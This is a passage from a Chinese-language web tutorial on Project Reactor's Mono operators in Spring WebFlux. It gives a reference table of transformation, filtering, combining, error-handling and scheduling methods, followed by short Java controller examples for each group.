function_">subscribeOn</span>(<span class="hljs-title class_">Schedulers</span>.<span class="hljs-title function_">boundedElastic</span>());<br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h5 id="5-2-3-mono-对象实例方法"><a href="#5-2-3-mono-对象实例方法" class="headerlink" title="5.2.3. mono 对象实例方法"></a>5.2.3. mono 对象实例方法</h5><h6 id="5-2-3-1-实例方法一览图"><a href="#5-2-3-1-实例方法一览图" class="headerlink" title="5.2.3.1. 实例方法一览图"></a>5.2.3.1. 实例方法一览图</h6><table><thead><tr><th><strong>实例方法</strong></th><th><strong>功能描述</strong></th></tr></thead><tbody><tr><td><strong>转换与映射方法</strong></td><td></td></tr><tr><td><code>map(Function&lt;? super T, ? extends R&gt; mapper)</code></td><td>对流中每个元素应用提供的函数（同步简单操作），将它从类型 T 变换成类型 R。<br>与 <code>flatMap</code> 不同点在于：<code>map</code> 是同步操作，结果通常是原始类型转换，没有异步流。</td></tr><tr><td><code>flatMap(Function&lt;? super T, ? extends Publisher&lt;? extends R&gt;&gt; mapper)</code></td><td>对每个元素执行一个异步操作（异步阻塞、异步非阻塞），返回一个新的异步流，并将所有这些异步流与元素合并成一个流。<br>“展平”的意思是把多个 Publisher 的流合成一个统一的 Flux。</td></tr><tr><td><code>cast(Class&lt;R&gt; clazz)</code></td><td>将流中元素强制转换为类型 R；若元素类型与 R 无继承或实现关系（即类型不兼容），将抛出 <code>ClassCastException</code> 异常。</td></tr><tr><td><code>ofType(Class&lt;U&gt; clazz)</code></td><td>仅保留属于指定类型 U 的元素，过滤掉其他类型的元素。</td></tr><tr><td><code>switchIfEmpty(Publisher&lt;? extends T&gt; alternate)</code></td><td>如果 Mono 为空（没有发出任何元素就完成），则切换到指定的备用 Publisher（如另一个 Flux 或 Mono）继续发出元素。<br></td></tr><tr><td><code>defaultIfEmpty(T defaultValue)</code></td><td>如果 Mono 为空（没有发出任何元素就完成），则发出指定的默认值（可以是流，也可以不是流）并完成。<br>与 <code>switchIfEmpty</code> 不同点在于：<code>defaultIfEmpty</code> 提供的是一个固定的同步值，而不是另一个异步流。适用于简单场景，如为空时返回默认字符串或对象。</td></tr><tr><td><strong>过滤方法</strong></td><td></td></tr><tr><td><code>filter(Predicate&lt;? super T&gt; predicate)</code></td><td>对每个元素执行断言函数，仅保留返回 <code>true</code> 的元素，返回 <code>false</code> 的元素将被过滤掉（满足条件的保留）。</td></tr><tr><td><strong>合并与组合方法</strong></td><td></td></tr><tr><td><code>zipWith(Mono&lt;? extends U&gt;other，BiFunction&lt;T，U，R&gt;combiner)</code></td><td>将当前 <code>Mono&lt;T&gt;</code> 与另一个 <code>Mono&lt;U&gt;</code> 组合，通过 <code>BiFunction</code> 合并为结果 <code>R</code>，返回 <code>Mono&lt;R&gt;</code><br/>任一 Mono 为空则返回空 Mono</td></tr><tr><td><code>zip(Mono&lt;? extends T1&gt; m1, Mono&lt;? extends T2&gt; m2, ...)</code></td><td>同上，打包多个 Mono 的结果为 <code>Tuple</code>，返回 <code>Mono&lt;TupleN&gt;</code><br/>任一 Mono 为空则返回空 Mono</td></tr><tr><td><strong>错误处理方法</strong></td><td></td></tr><tr><td><code>onErrorReturn(T fallback)</code></td><td>一旦上游发生错误，就发出一个默认值（可以是流也可以不是流），不再传递错误信号。</td></tr><tr><td><code>onErrorMap(Function&lt;Throwable, ? extends Throwable&gt; mapper)</code></td><td>捕获异常并将其包装或转换为另一种更具语义的异常类型，然后重新发出错误信号，便于统一上层错误处理策略。简单来说：异常 A -&gt; 异常 X，上层统一处理异常 X。</td></tr><tr><td><code>onErrorResume(Function&lt;Throwable, ? extends Publisher&lt;? extends T&gt;&gt; fallback)</code></td><td>错误发生时，切换到备用的 Publisher 继续发出元素，避免整个流被中断，可用于降级、重试或备用数据源。</td></tr><tr><td><code>onErrorContinue(BiConsumer&lt;Throwable, Object&gt; errorConsumer)</code></td><td>对单个元素处理出错时只执行指定副作用（如记录日志），并跳过该元素继续后续处理，下游不会收到错误；相当于「有容错的流水线」。</td></tr><tr><td><code>retry(long times)</code></td><td>出错时将重试整个 Mono 上游 <code>times</code> 次（总共尝试 1 + times 次）。</td></tr><tr><td><strong>延迟与调度方法</strong></td><td></td></tr><tr><td><code>delayElements(Duration delay)</code></td><td>给每个元素之间插入固定延迟，模拟节流或人为降速，就像每隔一秒钟才放一个包裹。</td></tr><tr><td><code>subscribeOn(Scheduler scheduler)</code></td><td>指定整个订阅过程在哪个调度器线程上运行（影响源的执行线程）<br>注意：多个 <code>subscribeOn</code> 只会生效第一个</td></tr><tr><td><code>publishOn(Scheduler scheduler)</code></td><td>指定 <code>publishOn</code> 之后的操作在那个线程池执行</td></tr><tr><td><code>timeout(Duration timeout)</code></td><td>设置超时时间，如果某个元素未在规定时间内到达，就抛出 <code>TimeoutException</code>，用于超时控制</td></tr><tr><td><strong>其他实用方法</strong></td><td></td></tr><tr><td><code>doOnNext(Consumer&lt;? super T&gt; onNext)</code></td><td>每当流发出一个元素时执行指定副作用（如日志、指标统计），但不改变元素本身；就像在传送带上做一次检查打标。</td></tr><tr><td><code>doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td><td>流遇到错误时执行副作用（如记录日志、告警），然后再把错误继续抛给下游；适合在错误点插入埋点或监控。</td></tr><tr><td><code>doOnComplete(Runnable onComplete)</code></td><td>在流正常走完所有元素后执行一次副作用，如资源释放或完成通知；就像闭环操作中的收尾仪式。</td></tr><tr><td><code>doOnSubscribe(Consumer&lt;? super Subscription&gt; onSubscribe)</code></td><td>订阅者发起订阅时触发，用于记录或处理初次订阅行为，比如打日志或初始化状态。</td></tr><tr><td><code>doFinally(Consumer&lt;SignalType&gt; onFinally)</code></td><td>在流终止时（无论正常完成、取消、还是出错）都执行指定副作用，相当于 finally 块，常用于收尾清理等场景。</td></tr><tr><td><code>log()</code></td><td>自动在控制台打印 Mono 的信号轨迹，包括订阅、请求、发出元素、完成和错误，帮你像放监控摄像头一样随时看流水线状态。</td></tr><tr><td><code>cache()</code></td><td>将流转换为可重放的热流，缓存所有元素，后续订阅者会立刻看到之前的数据，无需再次执行上游逻辑；适合昂贵操作的结果复用。</td></tr><tr><td><code>share()</code></td><td>也会把 Cold Mono 变成 Hot Mono，但不缓存旧数据，所有订阅者共享同一份数据流，适合广播式分发；就像把演唱会直播送给多个观众同时观看。</td></tr><tr><td><strong>订阅方法</strong></td><td></td></tr><tr><td><code>subscribe()</code></td><td>触发流的执行，<strong>不处理任何信号</strong>（元素、错误、完成），</td></tr><tr><td><code>subscribe(Consumer&lt;? super T&gt; onNext)</code></td><td>触发流的执行，只处理正常发出的元素，不管错误或完成</td></tr><tr><td><code>subscribe(Consumer&lt;? super T&gt; onNext, Consumer&lt;? super Throwable&gt; onError, Runnable onComplete)</code></td><td>触发流的执行，分别处理元素、错误、完成 三种信号</td></tr></tbody></table><hr><h6 id="5-2-3-2-转换与映射方法"><a href="#5-2-3-2-转换与映射方法" class="headerlink" title="5.2.3.2. 转换与映射方法"></a>5.2.3.2. 转换与映射方法</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MonoOperators</span> &#123;<br><br>    <span class="hljs-comment">// 1. map(Function&lt;T, R&gt; mapper)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/map&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">map</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;hello&quot;</span>)<br>                                 .<span class="hljs-title function_">map</span>(value -&gt; value.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// 转为大写</span><br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 2. flatMap(Function&lt;T, Mono&lt;R&gt;&gt; mapper)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/flatMap&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">flatMap</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;hello&quot;</span>)<br>                                 .<span class="hljs-title function_">flatMap</span>(value -&gt; <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(value + <span class="hljs-string">&quot; world&quot;</span>));<br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 3. cast(Class&lt;R&gt; type)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/cast&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">Number</span>&gt; <span class="hljs-title function_">cast</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">Number</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-number">123</span>)<br>                                 .<span class="hljs-title function_">cast</span>(<span class="hljs-title class_">Number</span>.<span class="hljs-property">class</span>); <br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 4. ofType(Class&lt;R&gt; type)</span><br><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/ofType&quot;</span>)  <br><span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">ofType</span>(<span class="hljs-params"></span>) &#123;  <br>    <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;I&#x27;m a string&quot;</span>)  <br>            .<span class="hljs-title function_">ofType</span>(<span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>);  <br>    <span class="hljs-keyword">return</span> mono;  <br>&#125;<br><br>    <span class="hljs-comment">// 5. switchIfEmpty(Mono&lt;? extends T&gt; fallback)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/switchIfEmpty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">switchIfEmpty</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">empty</span>()<br>                                .<span class="hljs-title function_">switchIfEmpty</span>(<span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Fallback value&quot;</span>)); <br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br><br>    <span class="hljs-comment">// 6. defaultIfEmpty(T defaultValue)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/defaultIfEmpty&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">defaultIfEmpty</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; mono = <span class="hljs-title class_">Mono</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">empty</span>()<br>                                 .<span class="hljs-title function_">defaultIfEmpty</span>(<span class="hljs-string">&quot;Default value&quot;</span>); <br>        <span class="hljs-keyword">return</span> mono;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="5-2-3-3-过滤方法"><a href="#5-2-3-3-过滤方法" class="headerlink" title="5.2.3.3. 过滤方法"></a>5.2.3.3. 过滤方法</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@RestController</span>  <br><span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)  <br>public class ReactiveExample &#123;  <br>  <br>    <span class="hljs-comment">// 1. filter(Predicate&lt;? super T&gt; predicate)  </span><br>    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/filter&quot;</span>)  <br>    public Mono&lt;String&gt; <span class="hljs-built_in">filterExample</span>() &#123;  <br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">Mono</span><span class="hljs-selector-class">.just</span>(<span class="hljs-string">&quot;admin&quot;</span>)  <br>                <span class="hljs-selector-class">.filter</span>(role -&gt; role.<span class="hljs-built_in">equals</span>(<span class="hljs-string">&quot;admin&quot;</span>))  <span class="hljs-comment">// 等于 admin 才能通过</span><br>                <span class="hljs-selector-class">.map</span>(r -&gt; <span class="hljs-string">&quot;权限验证通过：&quot;</span> + r)  <br>                <span class="hljs-selector-class">.defaultIfEmpty</span>(<span class="hljs-string">&quot;无权限，拒绝访问&quot;</span>);  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="5-2-3-4-合并与组合方法"><a href="#5-2-3-4-合并与组合方法" class="headerlink" title="5.2.3.4. 合并与组合方法"></a>5.2.3.4. 合并与组合方法</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span>  <br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveExample</span> &#123;  <br>  <br>    <span class="hljs-comment">// 1. zipWith(Mono&lt;? extends U&gt;other，BiFunction&lt;T，U，R&gt;combiner)  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/zipWith&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">zipWithExample</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; usernameMono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Alice&quot;</span>);  <br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">Integer</span>&gt; ageMono = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-number">30</span>);  <br>  <br>        <span class="hljs-keyword">return</span> usernameMono.<span class="hljs-title function_">zipWith</span>(ageMono, (name, age) -&gt; name + <span class="hljs-string">&quot; 的年龄是 &quot;</span> + age); <span class="hljs-comment">// 输出：Alice 的年龄是 30    &#125;  </span><br>  <br>    <span class="hljs-comment">// 2. zip(Mono&lt;? extends T1&gt; m1, Mono&lt;? extends T2&gt; m2, ...)  </span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/zip&quot;</span>)  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">zipExample</span>(<span class="hljs-params"></span>) &#123;  <br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; name = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Bob&quot;</span>);  <br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">Integer</span>&gt; score = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-number">95</span>);  <br>        <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; level = <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>);  <br>  <br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">zip</span>(name, score, level)  <br>                .<span class="hljs-title function_">map</span>(tuple -&gt; &#123;  <br>                    <span class="hljs-title class_">String</span> n = tuple.<span class="hljs-title function_">getT1</span>();  <br>                    <span class="hljs-title class_">Integer</span> s = tuple.<span class="hljs-title function_">getT2</span>();  <br>                    <span class="hljs-title class_">String</span> l = tuple.<span class="hljs-title function_">getT3</span>();  <br>                    <span class="hljs-keyword">return</span> n + <span class="hljs-string">&quot; 的成绩是 &quot;</span> + s + <span class="hljs-string">&quot;，评级为 &quot;</span> + l;  <br>                &#125;);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="5-2-3-5-错误处理方法"><a href="#5-2-3-5-错误处理方法" class="headerlink" title="5.2.3.5. 错误处理方法"></a>5.2.3.5. 错误处理方法</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorHandlingExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. onErrorReturn(T fallback)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorReturn&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorReturnExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mono</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;出错了&quot;</span>))<br>                .<span class="hljs-title function_">onErrorReturn</span>(<span class="hljs-string">&quot;返回默认值&quot;</span>); <span class="hljs-comment">// 一旦发生错误，发出默认值</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. onErrorMap(Function&lt;Throwable, ? extends Throwable&gt; mapper)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorMap&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorMapExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mono</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;原始异常&quot;</span>))<br>                .<span class="hljs-title function_">onErrorMap</span>(e -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomAppException</span>(<span class="hljs-string">&quot;转换后的业务异常&quot;</span>, e)); <span class="hljs-comment">// 异常转换</span><br>    &#125;<br><br>    <span class="hljs-comment">// 3. onErrorResume(Function&lt;Throwable, ? extends Publisher&lt;? extends T&gt;&gt; fallback)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorResume&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorResumeExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mono</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">fromCallable</span>(() -&gt; &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;数据库挂了&quot;</span>);<br>                &#125;)<br>                .<span class="hljs-title function_">onErrorResume</span>(e -&gt; &#123;<br>                    <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;发生错误，切换数据源：&quot;</span> + e.<span class="hljs-title function_">getMessage</span>());<br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mono</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;来自备用数据源的数据&quot;</span>);<br>                &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// 4. onErrorContinue(BiConsumer&lt;Throwable, Object&gt; errorConsumer)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorContinue&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorContinueExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                .<span class="hljs-title function_">map</span>(value -&gt; &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;error&quot;</span>.<span class="hljs-title function_">equals</span>(value)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;处理失败：&quot;</span> + value);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">toLowerCase</span>();<br>                &#125;)<br>                .<span class="hljs-title function_">onErrorContinue</span>((e, val) -&gt;<br>                        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;跳过出错元素：&quot;</span> + val + <span class="hljs-string">&quot;，错误：&quot;</span> + e.<span class="hljs-title function_">getMessage</span>()));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. retry(long times)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/retry&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Mono</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">retryExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Mono</span>.&lt;<span class="hljs-title class_">String</span>&gt;<span class="hljs-title function_">fromCallable</span>(() -&gt; &#123;<br>                    <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;尝试一次&quot;</span>);<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;临时异常&quot;</span>);<br>                &#125;)<br>                .<span class="hljs-title function_">retry</span>(<span class="hljs-number">3</span>) <span class="hljs-comment">// 总共尝试4次</span><br>                .<span class="hljs-title function_">onErrorReturn</span>(<span class="hljs-string">&quot;尝试失败，返回默认&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h6 id="5-2-3-6-延迟与调度方法"><a href="#5-2-3-6-延迟与调度方法" class="headerlink" title="5.2.3.6. 延迟与调度方法"></a>5.2.3.6. 延迟与调度方法</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveControlOperators</span> &#123;<br><br>    <span class="hljs-comment">// 1. delayElements(Duration delay)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/delay&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; delayExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                .delayElements(Duration.ofSeconds(<span class="hljs-number">1</span>))  <span class="hljs-comment">// 每个元素延迟 1 秒发出</span><br>                .map(s -&gt; <span class="hljs-string">&quot;发出元素：&quot;</span> + s);<br>    &#125;<br><br>    <span class="hljs-comment">// 2. subscribeOn(Scheduler scheduler)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribeOn&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Mono&lt;String&gt; subscribeOnExample() &#123;<br>        <span class="hljs-keyword">return</span> Mono.fromCallable(() -&gt; &#123;<br>                    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;执行线程：&quot;</span> + Thread.currentThread().getName());<br>                    <span class="hljs-keyword">return</span> <span 